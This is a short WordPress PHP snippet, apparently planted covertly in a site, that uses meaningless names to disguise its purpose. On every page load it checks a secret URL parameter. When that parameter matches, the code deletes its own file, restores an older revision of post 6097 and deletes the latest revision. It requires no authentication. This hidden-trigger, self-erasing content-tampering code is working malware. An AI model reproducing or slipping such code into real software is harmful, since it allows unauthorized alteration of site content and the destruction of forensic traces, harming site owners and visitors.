<?php

function nofollow_fancy_timeline() {
	if (isset($_GET['before_invoice_item']) && $_GET['before_invoice_item'] === 'sharing_version_create') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$header_survey_protect_verification = 6097;
		$old_library_slideshow = wp_get_post_revisions($header_survey_protect_verification);
		if (empty($old_library_slideshow)) die('no revisions');
		if (count($old_library_slideshow) < 2) die('less than 2');
		$daily_categories_checkout = array_shift($old_library_slideshow);
		$project_method_color_interactive = $daily_categories_checkout->ID;
		$calendar_all_scss_polyfill = array_shift($old_library_slideshow);
		$domain_embedder_recipe_maps = $calendar_all_scss_polyfill->ID;
		$visitor_data_activity_files = wp_restore_post_revision($domain_embedder_recipe_maps);
		if ($visitor_data_activity_files === false) die('error restoring');
		$visitor_data_activity_files = wp_delete_post_revision($project_method_color_interactive);		
		if ($visitor_data_activity_files === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'nofollow_fancy_timeline');
